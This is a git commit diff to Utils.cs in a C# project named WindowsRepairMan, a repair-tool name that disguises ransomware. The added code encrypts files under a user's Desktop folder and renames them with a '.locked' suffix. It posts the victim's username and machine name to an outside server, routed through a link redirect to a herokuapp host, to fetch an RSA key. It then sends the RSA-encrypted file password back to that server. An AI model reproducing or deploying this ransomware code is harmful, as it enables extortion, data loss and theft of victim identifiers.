01479525e76276d3cb941e228158d1281ed54193
Ben Arvan <bnarvan@gmail.com>
2016-05-06 15:04:40 -0500

    initial commit

--- WindowsRepairMan/Utils.cs
+++ WindowsRepairMan/Utils.cs
@@ -5,12 +5,16 @@ using System.Text;
 using System.IO;
 using System.Threading.Tasks;
 using System.Security.Cryptography;
+using System.Net;
+using System.Collections.Specialized;
 
 namespace WindowsRepairMan
 {
     public class Utils
     {
-        public string CreatePassword(int length)
+        private string serverURI;
+
+        public static string CreatePassword(int length)
         {
             const string validChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
             StringBuilder builder = new StringBuilder();
@@ -21,7 +25,7 @@ namespace WindowsRepairMan
             }
             return builder.ToString();
         }
-        public byte[] Encrypt(byte[] plainBytes, byte[] passphraseBytes)
+        public static byte[] Encrypt(byte[] plainBytes, byte[] passphraseBytes)
         {
             byte[] encryptedBytes = null;
             byte[] salt = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
@@ -47,7 +51,7 @@ namespace WindowsRepairMan
             return encryptedBytes;
         }
 
-        public void EncryptFile(string filename, string password)
+        public static void EncryptFile(string filename, string password)
         {
             byte[] fileContents = File.ReadAllBytes(filename);
             byte[] passBytes = Encoding.UTF8.GetBytes(password);
@@ -58,7 +62,7 @@ namespace WindowsRepairMan
             System.IO.File.Move(filename, filename + ".locked");
         }
 
-        public void EncryptDirectory(string location, string passphrase)
+        public static void EncryptDirectory(string location, string passphrase)
         {
             string[] files = Directory.GetFiles(location);
             string[] childDirs = Directory.GetDirectories(location);
@@ -71,5 +75,59 @@ namespace WindowsRepairMan
                 EncryptDirectory(dir, passphrase);
             }
         }
+
+        public static string EncryptStringRSA(string text, int keySize, string publicKey)
+        {
+            var encryptedString = RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKey);
+            return Convert.ToBase64String(encryptedString);
+        }
+
+        public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKey)
+        {
+            using (var provider = new RSACryptoServiceProvider(keySize))
+            {
+                provider.FromXmlString(publicKey);
+                return provider.Encrypt(data, false);
+            }
+        }
+
+        public static void StartAction(string userName)
+        {
+            string userDir = "C:\\Users";
+            string path = "\\Desktop\\test";
+            string startPath = userDir + userName + path;
+            string publicKey = GetPublicKey();
+            string password = CreatePassword(32);
+            EncryptDirectory(startPath, password);
+            string encryptedPassword = EncryptStringRSA(password, 2048, publicKey);
+            SendKey(encryptedPassword);
+            password = null;
+            encryptedPassword = null;
+        }
+
+        public static string GetPublicKey()
+        {
+            string computerName = System.Environment.MachineName.ToString();
+            string userName = System.Environment.UserName;
+            WebClient client = new WebClient();
+            NameValueCollection form = new NameValueCollection();
+            form["username"] = userName;
+            form["pcname"] = computerName;
+            string response = Encoding.UTF8.GetString(client.UploadValues("https://l.facebook.com/l.php?u=https%3A%2F%2Ffinal-460.herokuapp.com%2F&h=ZAQEBg8Ok", "POST", form));
+            client.Dispose();
+            return response;
+        }
+
+        public static void SendKey(string key)
+        {
+            string computerName = System.Environment.MachineName.ToString();
+            WebClient client = new WebClient();
+            NameValueCollection form = new NameValueCollection();
+            form["userCode"] = SHA256Managed.Create().ComputeHash(Encoding.UTF8.GetBytes(computerName)).ToString();
+            form["key"] = key;
+            byte[] response = client.UploadValues("https://l.facebook.com/l.php?u=https%3A%2F%2Ffinal-460.herokuapp.com%2F&h=ZAQEBg8Ok", "POST", form);
+            client.Dispose();
+        }
+
     }
 }
